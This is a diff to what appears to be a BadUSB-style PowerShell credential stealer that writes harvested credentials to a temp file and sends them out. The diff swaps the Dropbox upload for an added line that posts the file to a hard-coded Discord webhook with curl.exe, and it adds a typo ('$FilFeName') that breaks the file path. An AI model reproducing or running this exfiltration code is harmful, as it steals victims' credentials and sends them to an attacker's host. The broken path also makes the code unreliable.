@@ -34,7 +34,7 @@
 
 #------------------------------------------------------------------------------------------------------------------------------------
 
-$DropBoxAccessToken = "YOUR-DROPBOX-ACCESS-TOKEN"
+#$DropBoxAccessToken = "YOUR-DROPBOX-ACCESS-TOKEN"
 
 #------------------------------------------------------------------------------------------------------------------------------------
 
@@ -140,15 +140,18 @@ echo $creds >> $env:TMP\$FileName
 #>
 
 $TargetFilePath="/$FileName"
-$SourceFilePath="$env:TMP\$FileName"
+$SourceFilePath="$env:TMP\$FilFeName"
 $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
 $authorization = "Bearer " + $DropBoxAccessToken
 $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
 $headers.Add("Authorization", $authorization)
 $headers.Add("Dropbox-API-Arg", $arg)
 $headers.Add("Content-Type", 'application/octet-stream')
-Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
 
+
+#####Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
+STRING $url="https://discord.com/api/webhooks/1042452496423063582/nHFRhkJWFJa1Daa6VChkIOg4SmURaZwcGH8bWNkv_6HLPGQEftPQ7k6_CwOlXVIQpa2V";Invoke-RestMethod -ContentType 'Application/Json' -Uri $url  -Method Post -Body ($Body | ConvertTo-Json);curl.exe -F "file1=@$SourceFilePath" $url
+ENTER
 #------------------------------------------------------------------------------------------------------------------------------------
 
 <#
